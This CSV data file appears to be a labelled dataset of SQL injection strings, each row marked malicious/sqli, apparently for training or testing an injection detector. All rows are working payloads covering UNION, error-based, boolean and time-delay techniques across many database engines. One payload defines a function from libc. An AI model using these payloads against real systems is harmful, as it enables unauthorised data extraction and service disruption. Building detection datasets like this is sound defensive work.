payload,label,attack_type
-4248 where 3288=3288 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,malicious,sqli
1%')) union all select null#,malicious,sqli
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""snht""=""snht",malicious,sqli
"1"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""bqfj"" like ""bqfj",malicious,sqli
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('plfa'='plfa",malicious,sqli
"1'+(select 'tzyz' where 4912=4912 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1') and 4595=4595#,malicious,sqli
"-4085'+(select aipn where 5493=5493 union all select 5493,5493,5493,5493,5493,5493,5493#",malicious,sqli
"-3151%""))) union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",malicious,sqli
"-1030"" where 2161=2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",malicious,sqli
"1%'))) and 8635=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1'||(select 'blvu' from dual where 9813=9813;select count(*) from generate_series(1,5000000))||'",malicious,sqli
"1' union all select null,null--",malicious,sqli
"1'||(select 'jmao' where 3009=3009;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
"-6770"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)",malicious,sqli
-6377' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'qcms' like 'qcms,malicious,sqli
"-2803') as jciy where 1130=1130 or make_set(4599=6550,6550)--",malicious,sqli
"1%') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('%'='",malicious,sqli
"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""pdqm"" like ""pdqm",malicious,sqli
1 where 3502=3502 order by 1--,malicious,sqli
"1"");select count(*) from generate_series(1,5000000) and (""kngx"" like ""kngx",malicious,sqli
"1"") as upjw where 3880=3880 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1) as hywx where 1424=1424 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
1));select sleep(5)#,malicious,sqli
-9509'))) or 1091=5477 and ((('gsmz'='gsmz,malicious,sqli
1) where 9683=9683;select (case when (1082=6755) then 1082 else 1082*(select 1082 from mysql.db) end)#,malicious,sqli
"-5643')) union all select 1515,1515#",malicious,sqli
"1"" where 9618=9618 and (3020=3020)*6703--",malicious,sqli
1'||(select 'yydv' from dual where 9639=9639;select case when 8514=3207 then 1 else null end--,malicious,sqli
1'||(select 'awba' from dual where 3749=3749 and 1445=3334--,malicious,sqli
-8370')) or (3501=6407)*6407 and (('agcm' like 'agcm,malicious,sqli
"-7715') union all select 4830,4830,4830,4830,4830,4830,4830,4830--",malicious,sqli
"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",malicious,sqli
"1))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((9474=9474",malicious,sqli
1' and sleep(5),malicious,sqli
1%');waitfor delay '0:0:5' and ('%'=',malicious,sqli
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('qvoy'='qvoy",malicious,sqli
1) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (3945=3945,malicious,sqli
"1"" where 4445=4445 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",malicious,sqli
"1%'))) union all select null,null,null#",malicious,sqli
-4582)) as gvfo where 8885=8885 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,malicious,sqli
-3880) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (5194=5194,malicious,sqli
"1"") where 1673=1673 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,sqli
"1')) union all select null,null,null,null,null,null,null,null,null,null--",malicious,sqli
1 and (select * from (select(sleep(5)))fzno),malicious,sqli
1'||(select 'xqqp' where 3007=3007 and (select * from (select(sleep(5)))gcrr)#,malicious,sqli
"1"" where 8483=8483 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"-1451%') union all select 7666,7666,7666#",malicious,sqli
"1"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""ccuy""=""ccuy",malicious,sqli
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",malicious,sqli
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('bgdp'='bgdp",malicious,sqli
-3062')) or 6872=6872 and (('uzth' like 'uzth,malicious,sqli
"1 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# couj",malicious,sqli
"1""));(select * from (select(sleep(5)))srmq) and ((""xeki"" like ""xeki",malicious,sqli
"1%"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""%""=""",malicious,sqli
1))) and (select * from (select(sleep(5)))gcrr)#,malicious,sqli
"-4592"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""xvpz""=""xvpz",malicious,sqli
-3998')) or 3038=3038,malicious,sqli
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",malicious,sqli
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",malicious,sqli
"-1830"")) as bptv where 4805=4805 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",malicious,sqli
"1)) as acni where 6355=6355 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
1%') or sleep(5) and ('%'=',malicious,sqli
"1)) as shmg where 1371=1371 union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
-6145 or (8459=8459)*4906-- yklv,malicious,sqli
"1') as uvxl where 6211=6211 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",malicious,sqli
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('lshk' like 'lshk",malicious,sqli
"1)) as kycl where 8008=8008 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1"")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
-3431%') or 9323=9323#,malicious,sqli
"1""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""oyxk""=""oyxk",malicious,sqli
"1%')) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
1%')) rlike (select * from (select(sleep(5)))vwyq)#,malicious,sqli
1'));select sleep(5) and (('ilcv'='ilcv,malicious,sqli
"-4615'))) or elt(1032=1032,3623) and ((('jipk' like 'jipk",malicious,sqli
"1'+(select 'ovti' where 4243=4243 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))+'",malicious,sqli
-8131')) or 9680=3467,malicious,sqli
"1' where 9116=9116 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1"")) and make_set(8403=8403,8899) and ((""ieuj"" like ""ieuj",malicious,sqli
"1') where 7252=7252;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,sqli
"-7078'||(select 'lcza' where 5076=5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",malicious,sqli
"1"");select count(*) from generate_series(1,5000000) and (""jzmg""=""jzmg",malicious,sqli
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",malicious,sqli
-8684' where 9820=9820 or 6844=5105,malicious,sqli
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-- xwoo,malicious,sqli
"1'+(select 'sacd' where 5984=5984 union all select null,null,null,null,null,null,null#",malicious,sqli
"1"")) as wooq where 7671=7671 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",malicious,sqli
"1')) as nlfq where 3410=3410 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",malicious,sqli
"1'||(select 'adiv' from dual where 9842=9842 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'",malicious,sqli
1'||(select 'gdzt' where 4950=4950;select sleep(5)#,malicious,sqli
"-4932%"")) or (3076=5927)*5927 and ((""%""=""",malicious,sqli
"-5657'))) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",malicious,sqli
"1' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,sqli
1';waitfor delay '0:0:5' and 'gsvt'='gsvt,malicious,sqli
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",malicious,sqli
1') and 2006=2006,malicious,sqli
1';waitfor delay '0:0:5' and 'fjpf' like 'fjpf,malicious,sqli
"1' where 2373=2373 union all select null,null#",malicious,sqli
"1'+(select 'sbvh' where 8539=8539 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",malicious,sqli
"-9076'+(select lqvj where 8551=8551 union all select 8551,8551,8551,8551--",malicious,sqli
1')) as zffq where 9572=9572 or 6793=(select 6793 from pg_sleep(5))--,malicious,sqli
"-9697) union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",malicious,sqli
"1%'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='",malicious,sqli
1));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,malicious,sqli
"1'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1%') and 3824=benchmark(5000000,md5(0x76555642)) and ('%'='",malicious,sqli
"1"" or (select * from (select(sleep(5)))sddo)#",malicious,sqli
"-7238%' or make_set(5375=9563,9563) and '%'='",malicious,sqli
"1%"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""%""=""",malicious,sqli
"1 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)# vojr",malicious,sqli
"1"")) as jsdc where 2748=2748;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",malicious,sqli
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'aicu'='aicu",malicious,sqli
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- lxey",malicious,sqli
-9389') order by 1#,malicious,sqli
"1'||(select 'iocs' where 9287=9287 and 8407=(select count(*) from generate_series(1,5000000)))||'",malicious,sqli
"-6626%"") or 1744=5292 and (""%""=""",malicious,sqli
"1));select count(*) from generate_series(1,5000000) and ((7240=7240",malicious,sqli
-2181') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('wyez'='wyez,malicious,sqli
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# ehsr",malicious,sqli
1') and 6969=(select 6969 from pg_sleep(5)) and ('ifvz' like 'ifvz,malicious,sqli
1%';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,malicious,sqli
"1%""))) and (3020=3020)*6703 and (((""%""=""",malicious,sqli
"-2373%"") or 9323=9323#",malicious,sqli
"1%');iif(9134=5736,1,1/0)",malicious,sqli
"1)) as huxq where 7451=7451 union all select null,null,null--",malicious,sqli
"-2226%"")) union all select 1018,1018,1018,1018--",malicious,sqli
"1"") where 3084=3084 union all select null,null--",malicious,sqli
"1%');select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
"1) as zqxa where 5718=5718 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1""))) or 4240=(select 4240 from pg_sleep(5))--",malicious,sqli
-7633') as aslj where 2317=2317 or 8571=8571--,malicious,sqli
"-9684"" order by 1#",malicious,sqli
"-6632) union all select 4073,4073,4073,4073,4073,4073,4073,4073--",malicious,sqli
1 or (select * from (select(sleep(5)))ydpu),malicious,sqli
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",malicious,sqli
"-2840'))) union all select 3025,3025,3025,3025--",malicious,sqli
"1"" and sleep(5)",malicious,sqli
"-6158""))) or 8571=8571--",malicious,sqli
"-6593"") union all select 6216,6216,6216,6216,6216,6216,6216#",malicious,sqli
1')) as yefv where 4263=4263;waitfor delay '0:0:5'--,malicious,sqli
1') where 4509=4509 union all select null--,malicious,sqli
"1"" where 8978=8978 union all select null,null,null,null,null,null,null,null--",malicious,sqli
"1) as rtpl where 1262=1262 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1') where 2852=2852;select case when 7717=7717 then 1 else null end--,malicious,sqli
"-3378%"")) union all select 9357,9357,9357,9357,9357--",malicious,sqli
"1))) and 3824=benchmark(5000000,md5(0x76555642)) and (((6556=6556",malicious,sqli
"-6186' in boolean mode) union all select 2990,2990,2990#",malicious,sqli
"1"")) rlike sleep(5) and ((""ahhx"" like ""ahhx",malicious,sqli
"-1597"" where 5933=5933 or 3038=3038",malicious,sqli
1) as ptxw where 9873=9873;begin dbms_lock.sleep(5); end--,malicious,sqli
"1) where 4698=4698 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""ygzq"" like ""ygzq",malicious,sqli
1 rlike (select (case when (6795=5898) then 1 else 0x28 end))-- xdkx,malicious,sqli
"-2798'+(select 'emui' where 9565=9565 union all select 9565,9565,9565,9565--",malicious,sqli
"1"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""rfpq""=""rfpq",malicious,sqli
1'))) and (select * from (select(sleep(5)))fzno) and ((('yctp'='yctp,malicious,sqli
1') and (select * from (select(sleep(5)))fzno) and ('eqfh'='eqfh,malicious,sqli
"1"" where 7788=7788 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xdce'='xdce",malicious,sqli
"1'+(select 'phtz' where 3171=3171;select count(*) from generate_series(1,5000000)--",malicious,sqli
